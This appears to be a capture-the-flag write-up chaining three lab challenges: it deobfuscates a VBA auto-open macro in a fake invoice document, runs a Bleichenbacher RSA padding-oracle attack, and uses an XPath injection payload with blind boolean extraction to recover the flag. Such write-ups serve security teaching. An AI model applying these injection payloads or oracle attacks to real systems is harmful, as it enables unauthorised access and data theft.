# CTF chain writeup - ctf7{vba_macro_bleichenbacher_xpath_pivot}

## Stage 1 - Forensics (http://2.31.70.16:16240/)

Downloaded `quarterly_invoice.doc` (OLE2 compound file with a VBA project).
`olevba` shows `Module1` with `AutoOpen`/`AutoExec`: strreverse + base64 + XOR.

    Private Const XKEY As Long = &H5A
    Private Function Deob(ByVal s As String) As String
        t = StrReverse(s)
        raw = DecodeBase64(t)
        raw(i) = raw(i) Xor XKEY
        ...
    cfg = Deob("r5GastGY/YTO7gSN3xDP1cnP/wyMyUXdgpSOucmL0MTNq4DN/EGauNmY5gWO5
                 8Dbr9DOshmb88zYjxWbtt2ajt2a88mapVQMuUzZ08TM14SB/YTO7gSN")

Reproducing it (reverse string -> base64 decode -> XOR 0x5A):

    oracle_token=otk_305f1191177699ef426be16ecc2c8942;endpoint=tcp://hived-off-oracle:16241

(`hived-off-oracle` is internal; the reachable endpoint is 2.31.70.16:16241.)

## Stage 2 - Crypto (nc 2.31.70.16 16241)

Protocol (one line per command):

    AUTH otk_305f1191177699ef426be16ecc2c8942
    -> service banner, then JSON {n, e=65537, k=128, target_ciphertext}, then OK
    DECRYPT <256 uppercase hex chars>        (no semicolon, lowercase rejected)
    -> VALID (PKCS#1 v1.5 conforming) / INVALID / ERR_BAD_INPUT

k = 128 -> 1024-bit RSA, but 256 hex chars = 1024 bits (because 2^1024 > n).
The oracle is a textbook Bleichenbacher PKCS#1 v1.5 padding oracle. Attack run:

* 8 parallel TCP connections, pipelined batches (server saturates near ~500 q/s).
* Step 1: s0 = ceil(n/3B), B = 2^(8(k-2)); scan for first conforming ciphertext.
* Step 2a/2b: interval narrowing per Bleichenbacher; in the single-interval
  phase candidates are taken from both ends of the interval
  (s = ceil((2B+rn)/b) and s = floor((3B-1+rn)/a)) which avoids the classic
  stalls, plus a consecutive-s fallback.
* Total: 32,554 oracle queries, 993 s, converged to the exact plaintext.

Recovered EM (hex):

    0002 b4d6fbde1957...  (97-byte PS with no zero byte) ... 00 61646d5f366136326132663439666139343861346630316162653930

Payload after the 0x00 separator:

    adm_6a62a2f49fa948a4f01abe90

## Stage 3 - Web (http://2.31.70.16:16242/)

POST /login  username=admin  password=adm_6a62a2f49fa948a4f01abe90
-> 200 {"message":"welcome, admin","status":"ok"} + Flask session cookie.

GET /search?q=alice returns the query that is built server-side:

    /directory/users/user[contains(displayName, 'alice')]/displayName

XPath injection point is the string literal inside contains(). Injection payload:

    q = zzz') or (PREDICATE) or ('

which yields

    contains(displayName, 'zzz') or (PREDICATE) or ('')      # both outer terms false

so the response is a clean boolean oracle (results list non-empty = true).

Discovery: count(//flag)>0 and count(//*[contains(.,'ctf7{')])>0.
Then blind extraction of (//flag)[1] by binary search over an alphabet using
contains("<half of alphabet>", substring((//flag)[1], pos, 1)).

Result:

    ctf7{vba_macro_bleichenbacher_xpath_pivot}

Verified with (//flag)[1] = "ctf7{vba_macro_bleichenbacher_xpath_pivot}" -> true.
